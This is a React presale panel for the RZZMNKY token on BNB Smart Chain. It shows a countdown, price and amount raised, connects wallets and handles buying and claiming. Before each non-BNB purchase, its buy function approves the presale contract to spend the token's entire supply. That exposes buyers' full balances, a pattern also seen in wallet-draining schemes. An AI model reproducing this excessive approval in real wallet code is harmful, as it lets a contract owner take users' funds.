import React, { useEffect, useState } from 'react';
import abi from '../utils/abi.json';
import token from '../utils/token.json';
import eth from '../assets/images/eth.svg';
import bnb from '../assets/images/bnb.svg';
import usdt from '../assets/images/usdt.svg';
import btc from '../assets/images/btc.svg';
import logo from '../assets/images/logo-monkey.svg';
import info from '../assets/images/info.svg';
import { useConnectModal } from '@rainbow-me/rainbowkit';
import { useAccount } from 'wagmi';
import { isMobile } from 'react-device-detect'; // Import isMobile

import Metamask from "../assets/images/metamask.svg"
import TrustWallet from "../assets/images/TW.svg"
import Coinbase from "../assets/images/CB.svg"
import { ethers } from 'ethers';
import Button from '@mui/material/Button';
import Typography from '@mui/material/Typography';
import Modal from '@mui/material/Modal';

import { Stack } from '@mui/material';

const style = {
  position: 'absolute',
  top: '50%',
  left: '50%',
  transform: 'translate(-50%, -50%)',
  width: 400,
  bgcolor: '#8b04fb',
  border: '2px solid white',
  boxShadow: 24,
  p: 4,
}

function Panel() {

  const [mobileOpen, setMobileOpen] = React.useState(false);
  const [deep, setDeep] = useState(false)
  const handleOpen = () => setMobileOpen(true);
  const handleClose = () => setMobileOpen(false);
  const presaleAddress = '0x17b7b615167559d5Ff86E1Acc6Eb3B4C6e8116cB';
  // Deployed on BSC
  const USDT = '0x55d398326f99059fF775485246999027B3197955';
  const BTCB = '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c';
  const ETHB = '0x2170Ed0880ac9A755fd29B2688956BD959F933F8';
  const WBNB = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';

  const ListingPrice = 0.00000696;
  const decimals = ethers.BigNumber.from(10).pow(18);
  const second = 1000;
  const minute = second * 60;
  const hour = minute * 60;
  const day = hour * 24;

  const { isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();

  const [currency, setCurrency] = useState('eth');
  const [presalePrice, setPresalePrice] = useState('');
  const [raised, setRaised] = useState(0);
  const [inputValue, setInputValue] = useState('0');
  const [expected, setExpected] = useState('0');
  const [redeemableTokens, setRedeemableTokens] = useState('0');
  const [timestamp, setTimestamp] = useState('');
  const [claimStartTime, setClaimStartTime] = useState('0');

  const [countdown, setCountdown] = useState({
    days: '00',
    hours: '00',
    minutes: '00',
    seconds: '00'
  });

  const currencies = [
    { id: 'eth', image: eth, label: 'ETH' },
    { id: 'usdt', image: usdt, label: 'USDT' },
    { id: 'bnb', image: bnb, label: 'BNB' },
    { id: 'btc', image: btc, label: 'BTC' }
  ];

  const handleClick = (event) => {
    setInputValue(0)
    setCurrency(event.currentTarget.id);
    setExpected(0)
  };

  const isButtonEnabled = () => {
    const currentTime = Math.floor(Date.now() / 1000); // Current Unix timestamp
    const isButtonDisabled = currentTime < timestamp;
    return isButtonDisabled;
  };

  function timeConverter(UNIX_timestamp) {
    var a = new Date(UNIX_timestamp * 1000);
    var months = [
      'Jan',
      'Feb',
      'Mar',
      'Apr',
      'May',
      'Jun',
      'Jul',
      'Aug',
      'Sep',
      'Oct',
      'Nov',
      'Dec'
    ];
    var year = a.getFullYear();
    var month = months[a.getMonth()];
    var date = a.getDate();
    var hour = a.getHours();
    var min = a.getMinutes();
    var sec = a.getSeconds();
    var time = date + ' ' + month + ' ' + year + ' ' + hour + ':' + min + ':' + sec;
    return time;
  }

  const getEndTime = async () => {
    const { ethereum } = window;
    try {
      const providers = new ethers.getDefaultProvider("https://bsc-dataseed.binance.org/")
      const contract = new ethers.Contract(presaleAddress, abi, providers);

      const endTimeStamp = await contract.getStageEndTime();
      const now = new Date().getTime();
      const distance = endTimeStamp.mul(1000).sub(now);

      if (distance.lt(0)) {
        // Event date has passed, stop the countdown
        setCountdown({
          days: '0',
          hours: '00',
          minutes: '00',
          seconds: '00'
        });
        return;
      }

      setCountdown({
        days: distance.div(day).toString().padStart(2, '0'),
        hours: distance.div(hour).mod(24).toString().padStart(2, '0'),
        minutes: distance.div(minute).mod(60).toString().padStart(2, '0'),
        seconds: distance.div(second).mod(60).toString().padStart(2, '0')
      });
    } catch (error) {
      console.log(error);
    }
  };

  const getPresalePrice = async () => {
    const { ethereum } = window;
    try {
      const providers = new ethers.getDefaultProvider("https://bsc-dataseed3.ninicoin.io	")

      const contract = new ethers.Contract(presaleAddress, abi, providers);
      const presalePrice = await contract.getPresalePrice();
      setPresalePrice(presalePrice.toString());
    } catch (error) {
      console.log(error);
    }
  };

  const getAmountRaised = async () => {
    const { ethereum } = window;
    try {
      const providers = new ethers.getDefaultProvider("https://bsc-dataseed3.ninicoin.io	")
      const contract = new ethers.Contract(presaleAddress, abi, providers);
      const amountRaised = await contract.getAmountRaised();
      setRaised(amountRaised.toString());
    } catch (error) {
      console.log(error);
    }
  };

  const getSpotPriceToken = async (e) => {
    setInputValue(e);
    const { ethereum } = window;
    try {
      const address =
        currency === 'eth' ? ETHB : currency === 'bnb' ? WBNB : currency === 'btc' ? BTCB : '';
      if (currency == 'usdt') {
        const val = ethers.utils.parseEther(e)
        const valv1 = val.div(presalePrice)

        setExpected(valv1);
      } else {
        const providers = new ethers.getDefaultProvider("https://bsc-dataseed3.ninicoin.io	")
        const contract = new ethers.Contract(presaleAddress, abi, providers);
        const spotPrice = await contract.getTokenPrice(
          ethers.utils.parseEther(e.toString()),
          address
        );
        setExpected(spotPrice.div(presalePrice).toString());
      }
    } catch (error) {
      console.log(error);
    }
  };

  const getRedeemableTokens = async () => {
    const { ethereum } = window;
    if (ethereum && isConnected) {
      try {
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(presaleAddress, abi, signer);
        const redeemable = await contract.Rizzbalance();
        setRedeemableTokens((redeemable / decimals).toString());
      } catch (error) {
        console.log(error);
      }
    }
  };
  const getClaimStartTime = async () => {
    const { ethereum } = window;
    if (ethereum && isConnected) {
      try {
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(presaleAddress, abi, signer);
        const claim_date = await contract.claimDate();
        setTimestamp(parseInt(claim_date));
        const converted_time = timeConverter(claim_date);
        setClaimStartTime(converted_time);
      } catch (error) {
        console.log(error);
      }
    }
  };
  const handleClickTrustWallet = () => {
    if (window.ethereum) {
      openConnectModal();
    } else {

      window.location.href = "https://link.trustwallet.com/open_url?&url=https://main--cheerful-queijadas-3c1b54.netlify.app/"
    }


  }
  const handleCoinBase = () => {

    if (window.ethereum) {

      openConnectModal()
    } else {

      window.location.href = "https://go.cb-w.com/dapp?cb_action=dapp&cb_url=https://main--cheerful-queijadas-3c1b54.netlify.app/"
    }

  }
  const handleMetamask = () => {
    if (window.ethereum) {
      openConnectModal()
    } else {

      window.location.href = "https://metamask.app.link/dapp/https://main--cheerful-queijadas-3c1b54.netlify.app/"
    }
  }

  const buy = async () => {
    const { ethereum } = window;
    if (ethereum && isConnected) {
      try {
        const address =
          currency === 'usdt'
            ? USDT
            : currency === 'eth'
              ? ETHB
              : currency === 'bnb'
                ? WBNB
                : currency === 'btc'
                  ? BTCB
                  : '';

        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(address, token, signer);
        const supply = await contract.totalSupply();
        const presaleContract = new ethers.Contract(presaleAddress, abi, signer);
        if (currency != 'bnb') {
          const approvalTx = await contract.approve(presaleAddress, supply);
          await approvalTx.wait();
          await presaleContract.buy(
            ethers.utils.parseEther(expected.toString()),
            ethers.utils.parseEther(inputValue),
            currency
          );
        } else {
          await presaleContract.buy(
            ethers.utils.parseEther(expected),
            ethers.utils.parseEther(inputValue),
            currency,
            {
              value: ethers.utils.parseEther(inputValue)
            }
          );
        }
      } catch (error) {
        console.log(error);
      }
    }
  };

  const claim = async () => {
    const { ethereum } = window;
    if (ethereum && isConnected) {
      try {
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const contract = new ethers.Contract(presaleAddress, abi, signer);
        const res = await contract.claim();
        console.log(res);
      } catch (error) {
        console.log(error);
      }
    }
  };

  useEffect(() => {
    setInterval(() => {
      getEndTime();
    }, 1000);
    getPresalePrice();
    getAmountRaised();
    getRedeemableTokens();
    getClaimStartTime();
  }, []);

  return (
    <div className="monkey_card">
      <div className="monkey_countdown">
        <div id="countdown">
          <ul>
            <li>
              <p>
                <span id="days">{countdown.days}</span> <br />{' '}
                <span className="count_name">DAYS</span>
              </p>
            </li>
            <li>
              <p>:</p>
            </li>
            <li>
              <p>
                <span id="hours">{countdown.hours}</span> <br />{' '}
                <span className="count_name">HOURS</span>
              </p>
            </li>
            <li>
              <p>:</p>
            </li>
            <li>
              <p>
                <span id="minutes">{countdown.minutes}</span> <br />{' '}
                <span className="count_name">MINUTES</span>
              </p>
            </li>
            <li>
              <p>:</p>
            </li>
            <li>
              <p>
                <span id="seconds">{countdown.seconds}</span> <br />{' '}
                <span className="count_name">SECONDS</span>
              </p>
            </li>
          </ul>
        </div>
      </div>
      <div className="monkey_progress">
        <div className="progress">
          <div className="bar" style={{ width: `${(raised / decimals / 570000) * 100}%` }}>
            <p className="percent">Until Next Price ${presalePrice / decimals}</p>
          </div>
        </div>
      </div>
      <div className="monekey_info">
        <p>USDT raised: {(raised / decimals).toFixed(5)}/$2,173,123.64</p>
        <p>LISTING PRICE:{ListingPrice}</p>
      </div>
      <div className="monkey_form_title">
        <span></span>
        <p>1 RZZMNKY= ${presalePrice / decimals}</p>
        <span></span>
      </div>
      <div className="monekey_tabs">
        <ul className="monekey_button">
          {currencies.map((cur) => (
            <li key={cur.id}>
              <button
                id={cur.id}
                className={currency === cur.id ? 'active' : undefined}
                onClick={handleClick}
              >
                <img src={cur.image} alt={cur.id} />
                <p>{cur.label}</p>
              </button>
            </li>
          ))}
        </ul>

        <div className="monkey_tabs_content">
          {/* single monkey form */}
          <div className="monkey_form ETH">
            <div className="from_input">
              <div className="form_group">
                <label htmlFor="">Amount in {currency.toUpperCase()} you pay </label>
                <input
                  type="number"
                  value={inputValue}
                  onChange={(e) => {
                    const inputText = e.target.value;
                    getSpotPriceToken(inputText);
                  }}
                />
              </div>
              <div className="img_currency">
                <img
                  src={
                    currency === 'eth'
                      ? eth
                      : currency === 'bnb'
                        ? bnb
                        : currency === 'usdt'
                          ? usdt
                          : btc
                  }
                  alt={currency}
                />
              </div>
            </div>

            <div className="from_input">
              <div className="form_group">
                <label htmlFor="">Amount in RZZMNKYyou receive</label>
                <input type="text" value={expected} readOnly />
              </div>
              <div className="img_monkey">
                <img src={logo} alt="" />
              </div>
            </div>

            <div className="form_submit_btn">
              {isConnected ? (
                <button onClick={buy}>Buy</button>
              ) : (
                <button onClick={() => isMobile && !window.ethereum ? handleOpen() : openConnectModal()}>CONNECT WALLET</button>
              )}
            </div>
            <div>
              <Modal

                open={mobileOpen}
                onClose={handleClose}
                aria-labelledby="modal-modal-title"
                aria-describedby="modal-modal-description"
              >
                <Stack sx={style} spacing={3} maxWidth={"fit-content"} >
                  <Typography id="modal-modal-title" variant="h6" component="h2" sx={{ color: "white" }}>
                    Choose Your Desired Wallet
                  </Typography>
                  <Button variant="outlined" sx={{ color: "white", border: "1px solid white" }} onClick={handleMetamask}><img width="20px" src={Metamask} alt='Metamask' ></img>Metamask</Button>
                  <Button variant="outlined" sx={{ color: "white", border: "1px solid white" }} onClick={handleCoinBase}><img width="20px" src={Coinbase} alt='Coinbase'></img>Coinbase</Button>
                  <Button variant="outlined" sx={{ color: "white", border: "1px solid white" }} onClick={handleClickTrustWallet}><img width="20px" src={TrustWallet} alt='TrustWallet'></img>Trust</Button>
                </Stack>
              </Modal>
            </div>

            {parseInt(redeemableTokens) > 0 && (
              <>
                <div className="claim">
                  <p>Next Redemption Date:{claimStartTime}</p>
                  <p>Your Purchased RZZMNKY:{redeemableTokens}</p>
                </div>
                <div className="form_submit_btn">
                  <button onClick={claim} disabled={isButtonEnabled()}>
                    Claim
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
      <a className="monkey_footer" href="#how_to">
        <img src={info} alt="" />
        <p>Learn how to buy</p>
      </a>
    </div>
  );
}

export default Panel;
